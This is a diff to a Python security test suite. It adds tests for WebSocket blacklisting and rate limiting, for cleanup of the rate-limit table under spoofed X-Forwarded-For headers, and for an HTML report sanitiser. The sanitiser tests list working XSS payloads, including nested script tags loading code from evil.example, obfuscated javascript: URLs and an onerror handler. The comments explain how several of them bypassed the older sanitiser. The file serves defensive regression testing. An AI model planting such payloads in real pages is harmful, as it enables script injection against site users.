@@ -164,6 +164,40 @@ def test_the_real_ip_is_taken_from_the_proxy_header():
     assert security.client_ip(_Req()) == "203.0.113.9"
 
 
+def test_the_websocket_is_guarded_too_not_just_the_http_routes(client, monkeypatch):
+    """安全中间件对 WebSocket **不生效** —— starlette 的 BaseHTTPMiddleware 见到非 http
+    的 scope 就直接放行。于是 /ws/chat 曾是唯一没有黑名单、没有限速的入口,而它恰好是
+    唯一真会驱动 agent 花钱的入口。36 个 HTTP 测试一条都抓不到这个,因为对 HTTP 它是好的。
+    """
+    monkeypatch.setattr(config, "SECURITY_IP_BLACKLIST", {"testclient"})
+    with pytest.raises(Exception):          # 被 close(1008) 掉,连不上
+        with client.websocket_connect("/ws/chat/s1"):
+            pass
+
+
+def test_a_rate_limited_client_cannot_open_a_websocket_either(client, monkeypatch):
+    monkeypatch.setattr(security, "RATE_LIMIT", 0)
+    monkeypatch.setattr(security, "_hits", {})
+    with pytest.raises(Exception):
+        with client.websocket_connect("/ws/chat/s1"):
+            pass
+
+
+def test_spoofed_forwarded_headers_do_not_grow_the_table_forever(monkeypatch):
+    """`client_ip` 认 X-Forwarded-For,而那是客户端给的 —— 每换一个值就是一个新键。
+
+    一个扫描器就能把这张表撑到几百万条。窗口空了就得删键:空 deque 不携带任何信息。
+    """
+    monkeypatch.setattr(security, "RATE_WINDOW", 0.01)
+    monkeypatch.setattr(security, "_SWEEP_THRESHOLD", 4)
+    monkeypatch.setattr(security, "_hits", {})
+    for n in range(50):
+        security.rate_limited(f"10.0.0.{n}")
+    time.sleep(0.02)                        # 让所有窗口过期
+    security.rate_limited("10.0.0.99")      # 这一次顺带触发清扫
+    assert len(security._hits) < 10, f"表里还剩 {len(security._hits)} 条"
+
+
 def test_wildcard_origins_and_credentials_cannot_both_be_on(monkeypatch):
     """浏览器会拒绝这个组合,但中间件不报错 —— 配错的人不会发现。"""
     monkeypatch.setattr(config, "CORS_ALLOWED_ORIGINS", ["*"])
@@ -246,6 +280,37 @@ def test_a_javascript_url_in_a_report_is_defused(report_dir):
 def test_raw_script_tags_in_a_report_never_reach_the_page(report_dir):
     html = render.report_html("x.md", "# 记\n\n<script>alert(1)</script>\n")
     assert "<script>alert(1)</script>" not in html
+
+
+# 报告不是全都出自我们之手:agent 的保存工具是聊天驱动的,提示词里让它写什么它就写什么。
+# 下面每一条都实测穿过过旧版清洗,不是想象出来的向量。
+@pytest.mark.parametrize("payload", [
+    # 单次替换会被拼接绕过:删掉内层 <script> 后,<scr 和 ipt src=...> 重新拼成活标签
+    "<scr<script>ipt src=http://evil.example/x.js>",
+    "<scr<scr<script>ipt>ipt src=http://evil.example/x.js>",
+    # 白名单只认带引号的属性值,裸写的直接穿过去
+    "<a href=javascript:alert(1)>click</a>",
+    "<img SRC=javascript:alert(1)>",
+    # 这几条旧版就挡得住,一并钉住,免得改清洗逻辑时把它们弄丢
+    '<a href="javascript:alert(1)">quoted</a>',
+    "<a hREf=JaVaScRiPt:alert(1)>case</a>",
+    '<a href=" java&#09;script:alert(1)">obfuscated</a>',
+    "<img src=x onerror=alert(1)>",
+])
+def test_no_known_payload_survives_into_the_rendered_report(report_dir, payload):
+    body = "\n".join(line for line in render.report_html("x.md", payload).splitlines()
+                     if "/web/" not in line)      # 模板自己的 <script src="/web/..."> 不算
+    lowered = body.lower()
+    assert "evil.example" not in lowered
+    assert "javascript:" not in lowered
+    assert "onerror" not in lowered
+
+
+def test_defusing_payloads_does_not_break_ordinary_links(report_dir):
+    """清洗过头和清洗不足一样是 bug —— 报告里的项目链接是它唯一的用处。"""
+    html = render.report_html("x.md", "[仓库](https://github.com/a/b)\n\n![图](/web/x.png)\n")
+    assert 'href="https://github.com/a/b"' in html
+    assert '/web/x.png' in html
 
 
 def test_a_web_asset_name_cannot_escape_the_web_directory():
